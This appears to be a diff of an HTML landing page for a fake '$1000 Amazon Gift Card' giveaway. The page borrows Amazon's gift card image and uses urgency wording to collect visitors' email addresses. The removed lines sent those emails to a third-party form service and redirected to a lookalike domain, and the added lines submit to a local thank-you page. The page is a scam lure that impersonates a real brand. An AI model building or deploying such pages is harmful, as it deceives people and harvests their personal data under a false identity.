@@ -3,128 +3,84 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>$1000 Amazon Gift Card</title>
+  <title>Amazon Gift Card Giveaway</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-    html, body {
+    body {
+      background-color: #eaf6f7;
       font-family: 'Poppins', sans-serif;
-      background-color: #eef5f8;
       margin: 0;
       padding: 0;
+      text-align: center;
     }
     .topbar {
       background-color: #002742;
-      color: #fff;
-      padding: 16px;
-      font-size: 22px;
+      color: white;
+      font-size: 20px;
+      padding: 14px 0;
       font-weight: 600;
-      text-align: center;
     }
     .container {
-      min-height: calc(100vh - 60px);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 30px 16px;
-    }
-    .card {
-      max-width: 480px;
-      width: 100%;
-      background: white;
+      background-color: white;
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 30px 20px;
       border-radius: 12px;
-      padding: 25px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.1);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
     }
     h1 {
-      color: #e48c00;
-      margin-bottom: 12px;
+      color: #d88e00;
       font-size: 24px;
-      text-align: center;
+      margin-bottom: 10px;
     }
     p {
       font-size: 15px;
-      margin-bottom: 20px;
       color: #333;
-      text-align: center;
+      margin-bottom: 20px;
     }
-    img {
+    .gift-img {
       width: 100%;
       border-radius: 8px;
       margin-bottom: 20px;
     }
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
     input[type="email"] {
+      width: 100%;
       padding: 14px;
-      font-size: 16px;
+      font-size: 15px;
       border-radius: 8px;
       border: 1px solid #ccc;
+      margin-bottom: 14px;
     }
     button {
-      background-color: #e48c00;
+      background-color: #e7a308;
       color: white;
       font-size: 16px;
-      padding: 12px;
+      font-weight: 600;
+      padding: 14px;
+      width: 100%;
       border: none;
       border-radius: 8px;
       cursor: pointer;
     }
     button:hover {
-      background-color: #cc7a00;
-    }
-    footer {
-      text-align: center;
-      font-size: 14px;
-      color: #666;
-      padding: 12px;
-    }
-
-    /* تكبير الشكل في الكمبيوتر */
-    @media (min-width: 1024px) {
-      .card {
-        max-width: 700px;
-        padding: 40px;
-      }
-
-      h1 {
-        font-size: 30px;
-      }
-
-      p {
-        font-size: 18px;
-      }
-
-      button {
-        font-size: 18px;
-        padding: 14px;
-      }
+      background-color: #cc9200;
     }
   </style>
 </head>
 <body>
-  <div class="topbar">Limited‑Time Giveaway</div>
+
+  <div class="topbar">Limited-Time Giveaway</div>
 
   <div class="container">
-    <div class="card">
-      <h1>Win a $1000 Amazon Gift Card!</h1>
-      <p>Enter your email below and claim your chance. This offer won't last long!</p>
-      <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card" />
-      <form action="https://getform.io/f/bdrnzjeb" method="POST">
-        <input type="email" name="email" placeholder="Enter your email" required />
-        <input type="hidden" name="_redirect" value="https://amazongiftcard.7t7k.top/thankyou.html" />
-        <button type="submit">Claim Now</button>
-      </form>
-    </div>
+    <h1>Win a $1000 Amazon Gift Card!</h1>
+    <p>Enter your email below and claim your chance. This offer won't last long!</p>
+    <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" class="gift-img" alt="Amazon Gift Card"/>
+    
+    <form action="thankyou.html" method="GET">
+      <input type="email" name="email" placeholder="Enter your email" required />
+      <button type="submit">Claim Now</button>
+    </form>
   </div>
 
-  <footer>&copy; 2025 Amazon Gift Campaign. All rights reserved.</footer>
 </body>
 </html>
